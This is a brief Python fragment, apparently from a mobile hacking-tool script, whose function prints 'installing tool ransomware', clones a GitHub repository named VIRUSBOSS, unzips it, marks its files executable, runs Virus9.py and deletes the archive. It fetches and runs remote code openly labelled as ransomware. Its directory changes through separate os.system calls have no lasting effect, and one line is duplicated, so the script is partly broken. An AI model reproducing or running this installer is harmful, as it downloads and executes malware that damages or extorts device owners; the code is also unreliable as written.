...
def slowprint():
        print("""\033[1;36m#####installing tool ransomware""")
        os.system ('cd /sdcard')
        os.system ('git clone https://github.com/DEV-BOSS/VIRUSBOSS')
        os.system ('cd /sdcard/VIRUSBOSS')
        os.system ('cd /sdcard/VIRUSBOSS')
        os.system ('unzip VIRUSBOSS.zip')
        os.system ('cd VIRUSBOSS && chmod +x * && python Virus9.py')
        os.system ('rm -rf VIRUSBOSS.zip')
slowprint()
